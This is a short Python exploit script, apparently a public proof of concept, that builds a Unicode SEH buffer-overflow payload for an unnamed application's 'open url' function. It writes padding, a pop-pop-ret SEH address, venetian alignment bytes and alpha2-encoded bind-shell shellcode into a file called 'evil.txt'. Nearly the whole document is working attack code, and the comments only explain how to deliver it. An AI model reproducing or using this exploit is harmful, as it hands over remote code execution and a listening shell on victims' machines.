#####################################################
## WriTTen By: van6uard
## Dustin Silveri
## Unicode foolz  0041
## Run script to create text file, then open app and copy and paste
## the payload into the 'open url' function.
## found seh unicode compatible address @ 0x004d0040 : pop esi # pop ebx # ret
## venetian fun -->
## used same shellcode from bind shell from alpha2
######################################################

filename = "evil.txt"

align = "\xbb\x56\x41m\xb8\x55\x41\xe3m\xb9\x4b\x41m\xb8\x6d\x41\xe1m\xba\x79\x41m\xb8\x63\x41\xe2mUmX\xfc\xfc\xfc\xfc\xfc\xdc\xdc\xdc\xdc\xdc\xdc\xec\xec\xec\xec\xcc\xcc\xf4\xf4\xd4\xf8\xf8\xf8\xf8\xf8\xf8\xd8\xd8\xd8\xd8\xe8\xe8\xe8\xe8\xc8\xc8\xc8\xf0\xf0\xf0\xf0\xf0\xf0\xf0\xf0\xd0m"

shellcode = "PPYAIAIAIAIAQATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBKLQZJKPMK8JYKOKOKO30TK2LO4NDTKQ5OL4K3LKURXM1ZODK0ON8DK1OMPKQZK19DKOD4KKQJNNQ7P4YVL3TWP3DKWWQWZLMKQXBJKKDOKB4O4O8T5YU4KQONDKQJKS6DKLL0K4KQOMLKQJKKSNL4K592LO4MLQQWSNQ9K1T4K13NP4KOPLL4KRPMLVMTKOPLHQNRH4NPNLNJLPPKOHVQV232FS8NSOBQXD7T3OBQO24KO8P2HHKZMKLOK20KOIFQO3Y9UQVU1ZMKXLBPUQZKRKOHPQXHYKYJUVM0WKO9FPS0SR3B3R3PC0SPC23KOJ0RFC8LQQL1VR3CYK1F5QXW4MJRPHGPWKO8VRJLPPQ0UKOXPQXW4VMNNYYQGKOHVPSQEKOHP38IUPIU6OYQGKO8VPP0TB4PUKOJ0631XJGBYWVRYPWKOHVPUKOXPBFRJQTQVS8QSRM3YYU2J0PR9MYXL59JGQZQ43Y9RP190KCVJKNPBNMKN12NLEC4MSJOH6KVKVK1XCBKN83MFKOT50DKOYFQKR722PQPQ0QRJKQR1R1B5B1KO8P1XVMZ9KUHN0SKO9F1ZKOKONWKOXPTK27KLU3XDS4KO8VB2KOXPQXJPCZM4QOQCKOIFKOXPA"


buffer = "http://"
buffer += "A"*301
buffer += "\x71\x71"
buffer += "\x40\x4d"
buffer += align
buffer += shellcode
buffer += "D"*(2000-301-2-2-len(align)-len(shellcode))


textfile = open(filename, 'w')
textfile.write(buffer)
textfile.close()

